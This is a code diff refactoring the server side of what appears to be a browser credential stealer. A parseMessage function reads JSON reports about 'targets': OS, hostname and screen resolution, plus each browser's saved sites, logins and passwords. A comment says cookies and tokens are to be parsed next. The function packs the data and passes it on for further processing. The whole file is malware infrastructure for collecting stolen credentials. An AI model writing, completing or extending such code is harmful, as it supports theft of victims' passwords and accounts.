@@ -78,47 +78,36 @@ namespace ServerSide {
 			explicit Request(std::string &&data):reqData(data) {};
 			std::string reqData;
 		};
-
 		std::queue<std::unique_ptr<Request>>requests;
 
-		void parseMessage(std::string& msg) {
-
-			std::unique_ptr<InterProcess::Data> data = std::make_unique<InterProcess::Data>();
-
+	private:
+		void parseMessage(std::string &msg) {
 			json::object jObj;
-			json::object targetInfo;
-			json::array browsers;
 			try {
-				jObj = boost::json::parse(msg).as_object();
+				jObj = boost::json::parse(msg).as_object(); //get jDoc obj.
 
-				data->_targetId = jObj.at("targetId").as_string();
+				InterProcess::DataBuilder dataBuilder(jObj.at("targetId").as_string().c_str()); //create data builder for current target's data
 
-				targetInfo = jObj.at("targetInfo").as_object();
+				json::object targetInfo = jObj.at("targetInfo").as_object();  //gets all target's info
+				dataBuilder.buildTargetInfo(targetInfo.at("os").as_string().c_str(),        //builds all target's info
+											targetInfo.at("hostname").as_string().c_str(),
+											targetInfo.at("resolution").as_string().c_str());
+			
+				for (auto& browser : jObj.at("Browsers").as_array()) { //iterations by browsers and their data's
+					auto browsName = browser.as_string().c_str(); //current browser name
+					dataBuilder.addBrowserData({}, std::optional(browsName)); //adds only the name to the browserData struct which is a part of the Data
 
-				data->_targetInfo.os = targetInfo.at("os").as_string();
-				data->_targetInfo.hostName = targetInfo.at("hostname").as_string();
-				data->_targetInfo.resolution = targetInfo.at("resolution").as_string();
-
-				browsers = jObj.at("Browsers").as_array();
-
-				for (auto& name : browsers) { //iterations by browsers and their data's
-					std::unique_ptr<InterProcess::Data::BrowserData> bd
-						= std::make_unique<InterProcess::Data::BrowserData>();
-
-					bd->browserName = json::value_to<std::string>(name);
-
-					json::object browserData = jObj.at(json::value_to<std::string>(name)).as_object(); //pick all current browser data
-
-					json::array loginData = browserData.at("loginData").as_array();
-					for (auto& elem : loginData) {                                   //parse all login's data of current browser 
-						bd->resources.push_back(std::make_tuple(json::value_to<std::string>(elem.at("resource")),
+					json::array loginData = jObj.at(browsName).at("loginData").as_array(); //pick all login's data of current browser
+					for (auto& elem : loginData) {                                         //parse all login's data of current browser 
+						dataBuilder.addBrowserData(std::optional(std::make_tuple(json::value_to<std::string>(elem.at("resource")), //adds login into the current browser struct in data
 							json::value_to<std::string>(elem.at("login")),
-							json::value_to<std::string>(elem.at("password"))));
+							json::value_to<std::string>(elem.at("password")))
+						),{});
 					}
 					//parse cookies tokens and etc.
-					data->browsersData.push_back(std::move(bd)); //after all data's extract
+					dataBuilder.commitBrowserData(); //after setting up a current browser data
 				}
-				ipc.newData(std::move(data));
+				ipc.newData(std::move(dataBuilder.getDataPtr())); //send all Data for ipc processing
 			}
 			catch (boost::system::system_error::exception& msg) {
 				std::cout << msg.what();
